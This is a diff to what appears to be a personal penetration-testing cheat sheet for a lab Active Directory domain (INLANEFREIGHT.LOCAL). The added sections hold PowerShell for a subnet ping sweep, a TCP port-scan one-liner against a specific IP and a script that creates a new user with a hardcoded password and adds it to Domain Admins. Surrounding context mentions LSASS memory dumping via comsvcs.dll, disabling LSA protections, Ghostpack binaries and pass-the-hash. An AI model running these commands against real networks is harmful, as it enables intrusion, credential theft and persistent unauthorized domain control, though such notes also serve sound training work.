@@ -99,6 +99,30 @@ Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "Disab
 
 https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
 
+## Network enumeration
+
+powershell to get current domain name
+```
+(Get-WmiObject Win32_ComputerSystem).Domain
+```
+.ps1 to find hosts in a network
+```
+$subnet = "172.16.9" # The first three octets of the subnet
+$lastOctetRange = 1..254
+
+foreach ($octet in $lastOctetRange) {
+    $ipAddress = "$subnet.$octet"
+    $result = Test-Connection -ComputerName $ipAddress -Count 1 -ErrorAction SilentlyContinue
+    if ($result -ne $null) {
+        Write-Host "$ipAddress is online."
+    }
+}
+```
+
+powershell to enumerate open ports of a host 
+```
+`1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.129.25.115",$_)) "Port $_ is open!"} 2>$null`
+```
 
 ## Process search
 powershell code
@@ -208,6 +232,28 @@ PS C:\Windows\System32> ./rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 
 
 ## Moving between Users
 
+
+
+## Move between 
+
+### get admin of DC create another admin user with powershell and active directory
+
+```
+Import-Module ActiveDirectory
+
+$NewUserParams = @{
+    SamAccountName = "NewAdminUser"   # Replace with desired username
+    UserPrincipalName = "VIVIG@INLANEFREIGHT.LOCAL"   # Replace with desired UPN
+    Name = "New Admin User"          # Replace with desired display name
+    GivenName = "New"                # Replace with desired first name
+    Surname = "Admin"                # Replace with desired last name
+    AccountPassword = (ConvertTo-SecureString "VIVIG123" -AsPlainText -Force)   # Replace with desired password
+    Enabled = $true
+}
+
+New-ADUser @NewUserParams
+Add-ADGroupMember -Identity "Domain Admins" -Members "NewAdminUser"
+```
 
 
 ### PTH from inside windows
